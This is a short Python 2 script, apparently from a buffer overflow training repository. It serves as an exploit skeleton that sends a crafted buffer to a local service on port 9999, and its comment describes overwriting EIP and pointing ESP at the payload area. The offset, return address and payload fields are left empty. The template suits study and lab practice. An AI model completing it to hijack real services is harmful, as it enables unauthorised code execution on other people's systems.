#!/usr/bin/python 
#https://github.com/gh0x0st
#gh0x0st@protonmail.com

'''
Crash the application using this buffer, and make sure that EIP is overwritten by B's (\x42) and that the ESP register points to the start of the C's (\x43).
'''


import socket,sys

address = '127.0.0.1'
port = 9999

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
